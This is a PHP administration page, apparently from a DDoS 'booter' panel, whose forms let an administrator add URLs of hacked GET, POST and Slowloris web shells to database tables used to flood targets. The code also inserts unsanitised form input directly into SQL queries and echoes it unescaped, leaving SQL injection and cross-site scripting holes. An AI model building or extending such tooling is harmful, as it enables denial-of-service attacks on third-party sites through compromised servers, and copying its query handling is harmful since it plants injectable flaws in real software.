<?php
require("header.php");

if(!checkAdmin()) {
die("<div class=\"box\">
    <h2>Administration Panel &bull; Access Denied</h2>
<div class=\"box-content\">
<p>You are not an administrator.</p>
</div></div>");
exit();
}

$host1 = $_POST['getshell'];
$host2 = $_POST['url2'];
$host3 = $_POST['url3'];

if (isset($_POST['Submit'])){
        if($_POST['getshell'] == "") {
        ?>
<div class="box">
<h2><a href="index.php">Error</a></h2>
<div class="box-content">
<p>You left the host input blank!</p>
</div>
</div>
        <?php
        } else {
	$query = "INSERT INTO getshells (url) VALUES ('$host1')";
	$result = mysql_query($query);
?>
<div class="box">
<h2><a href="index.php">Success!</a></h2>
<div class="box-content">
<p><center>Successfully added GET Shell, <font color="white"><?php echo $host1; ?></font> to the shells database.</center></p>
</div>
</div>
<?php
        }
}



if (isset($_POST['Submit2'])){
    if($host2 == "") {
    ?>
<div class="box">
<h2><a href="index.php">Error</a></h2>
<div class="box-content">
<p>You left the host input blank!</p>
</div>
</div>
        <?php 
        } else {
	$query = "INSERT INTO postshells (url) VALUES ('$host2')";
	$result = mysql_query($query);
echo '<hr>Successfully added POST Shell, ' . $host2 . ' to the shells database.';
}
}

if (isset($_POST['Submit3'])){
    if($host3 == "") {
    ?>
<div class="box">
<h2><a href="index.php">Error</a></h2>
<div class="box-content">
<p>You left the host input blank!</p>
</div>
</div>
    <?php
    } else {
	$query = "INSERT INTO slowloris (url) VALUES ('$host3')";
	$result = mysql_query($query);
echo '<hr>Successfully added Slowloris Shell, ' . $host3 . ' to the shells database.';
}
}
?>

<div class="box">
<h2><a href="index.php">Add Shells</a></h2>
<div class="box-content">

<?php if (checkAdmin()) { ?>
Input a PHP page extension of a shell below to insert it to the database: <br> <br>


Add a GET Shell: <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="getshell" type="text" id="getshell">
<input class="button" type="submit" name="Submit" value="Add Shell"></td>

</form>

<br>

Add a POST Shell: <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url2" type="text" id="url2"></td>
<input class="button" type="submit" name="Submit2" value="Add Shell">

<br>
<br>

Add a Slowloris Shell: <br> <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url3" type="text" id="url3"></td>
<input class="button" type="submit" name="Submit3" value="Add Shell">

</form>
</div>
</div>

<br>

<?php
}
include 'footer.php';
?>